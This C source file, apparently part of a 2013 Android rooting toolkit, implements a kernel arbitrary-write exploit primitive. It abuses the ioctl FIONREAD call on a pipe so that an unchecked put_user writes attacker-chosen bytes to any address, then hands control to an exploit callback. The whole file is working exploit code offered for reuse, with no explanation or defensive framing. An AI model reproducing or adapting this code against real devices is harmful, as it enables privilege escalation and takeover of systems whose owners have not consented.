/*
 *  Copyright (c) 2013 by fi01
 */

#include <sys/ioctl.h>
#include <stdio.h>
#include "put_user.h"

static bool
pipe_write_value_at_address(unsigned long address, int value)
{
  char data[4];
  int pfd[2];
  int i;

  *(int *)&data = value;

  if (pipe(pfd) == -1) {
    perror("pipe");
    return false;
  }

  for (i = 0; i < sizeof (data); i++) {
    char buf[256];

    buf[0] = 0;

    if (data[i]) {
      if (write(pfd[1], buf, data[i]) != data[i]) {
	printf("error in write().\n");
	break;
      }
    }

    if (ioctl(pfd[0], FIONREAD, (void *)(address + i)) == -1) {
      perror("ioctl");
      break;
    }

    if (data[i]) {
      if (read(pfd[0], buf, sizeof buf) != data[i]) {
	printf("error in read().\n");
	break;
      }
    }
  }

  close(pfd[0]);
  close(pfd[1]);

  return i == sizeof (data);
}

bool
put_user_write_value_at_address(unsigned long address, int value)
{
  return pipe_write_value_at_address(address, value);
}

bool
put_user_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!put_user_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
